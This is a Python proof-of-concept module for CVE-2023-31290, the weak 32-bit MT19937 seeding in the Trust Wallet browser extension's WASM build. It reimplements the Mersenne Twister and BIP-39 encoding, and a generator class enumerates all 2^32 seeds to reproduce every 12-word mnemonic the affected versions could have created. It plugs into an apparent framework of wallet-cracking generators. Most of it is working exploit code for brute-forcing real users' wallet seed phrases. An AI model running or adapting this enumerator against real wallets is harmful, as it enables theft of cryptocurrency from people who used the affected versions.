"""
Trust Wallet Core CVE-2023-31290 — WASM MT19937 Weak Seed Vulnerability

Reproduction logic (wasm/src/Random.cpp lines 19-22):
    void random_buffer(uint8_t* buf, size_t len) {
        std::mt19937 rng(std::random_device{}());
        std::generate_n(buf, len, [&rng]() -> uint8_t { return rng() & 0x000000ff; });
    }

Vulnerability:
    std::random_device{}() returns a uint32_t (32-bit)
    std::mt19937 is initialized with this 32-bit value for all 624x32-bit internal state
    random_buffer takes the low 8 bits of each output to fill buf
    For 12-word mnemonic: requires 16 bytes of entropy, calls mt19937 output 16 times with &0xFF

    Effective entropy: 32 bits (seed space 2^32 = 4,294,967,296)

Affected versions: Trust Wallet browser extension v0.0.172 ~ v0.0.182 (2022-2023)

Source references:
    targets/trust_wallet_core/wasm/src/Random.cpp (lines 14-23)
    targets/trust_wallet_core/trezor-crypto/crypto/bip39.c (lines 50-59)
    CVE-2023-31290 (Secbit Labs / Donjon-Ledger)
"""
import sys
import os
import struct
from hashlib import sha256
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
from base import PocGenerator

# Reuse the BIP-39 wordlist from coldcard POC
sys.path.insert(0, os.path.join(HERE, "..", "..", "coldcard", "yasmarang_bypass"))
from ngu.bip39 import wordlist_en as BIP39_WORDLIST


# === MT19937 Python Implementation (line-by-line equivalent of C++ std::mt19937) ===

class MT19937:
    """Faithful port of std::mt19937 (Mersenne Twister 32-bit)"""

    def __init__(self, seed: int):
        self.MT = [0] * 624
        self.index = 624
        self.MT[0] = seed & 0xFFFFFFFF
        for i in range(1, 624):
            self.MT[i] = (1812433253 * (self.MT[i-1] ^ (self.MT[i-1] >> 30)) + i) & 0xFFFFFFFF

    def _twist(self):
        for i in range(624):
            y = (self.MT[i] & 0x80000000) | (self.MT[(i + 1) % 624] & 0x7FFFFFFF)
            self.MT[i] = self.MT[(i + 397) % 624] ^ (y >> 1)
            if y & 1:
                self.MT[i] ^= 2567483615  # 0x9908B0DF
        self.index = 0

    def next_u32(self) -> int:
        if self.index >= 624:
            self._twist()
        y = self.MT[self.index]
        self.index += 1
        y ^= (y >> 11)
        y ^= (y << 7) & 2636928640   # 0x9D2C5680
        y ^= (y << 15) & 4022730752  # 0xEFC60000
        y ^= (y >> 18)
        return y & 0xFFFFFFFF


# === BIP-39 mnemonic generation from entropy bytes ===

def entropy_to_mnemonic(entropy_bytes: bytes) -> str:
    """BIP-39: 16 bytes (128 bit) -> 12-word mnemonic"""
    h = sha256(entropy_bytes).digest()
    # entropy bits + checksum (first 4 bits of SHA256)
    b = int.from_bytes(entropy_bytes, 'big')
    checksum_bits = (h[0] >> 4) & 0x0F  # first 4 bits for 128-bit entropy
    combined = (b << 4) | checksum_bits
    # 132 bits total -> 12 words x 11 bits
    words = []
    for i in range(11, -1, -1):
        idx = (combined >> (i * 11)) & 0x7FF
        words.append(BIP39_WORDLIST[idx])
    return ' '.join(words)


# === Core: generate mnemonic from seed ===

def generate_mnemonic_from_seed(seed: int) -> str:
    """
    Given the 32-bit return value of std::random_device (used as mt19937 seed),
    exactly reproduce the mnemonic generation of the Trust Wallet WASM extension.
    """
    mt = MT19937(seed)
    # random_buffer(data, 16): call mt.next() & 0xFF 16 times
    entropy = bytes([mt.next_u32() & 0xFF for _ in range(16)])
    return entropy_to_mnemonic(entropy)


# === POC Generator ===

TOTAL_SPACE = 2**32  # std::random_device seed space


class TwWasmMt19937Generator(PocGenerator):
    """
    Enumerates all 2^32 possible seed values of std::random_device,
    each deterministically producing the 12-word BIP-39 mnemonic generated
    by the Trust Wallet WASM extension.

    Effective entropy: 32 bits (mt19937 seed from std::random_device)
    Risk level: critical (<=40 bits)
    CVE: CVE-2023-31290
    """

    @property
    def poc_id(self) -> str:
        return "tw_wasm_mt19937"

    @property
    def poc_name(self) -> str:
        return "Trust Wallet WASM MT19937 Weak Seed (CVE-2023-31290)"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    @property
    def batch_size(self) -> int:
        return 10000

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for seed in range(start_index, TOTAL_SPACE):
            mnemonic = generate_mnemonic_from_seed(seed)
            yield (seed, mnemonic)
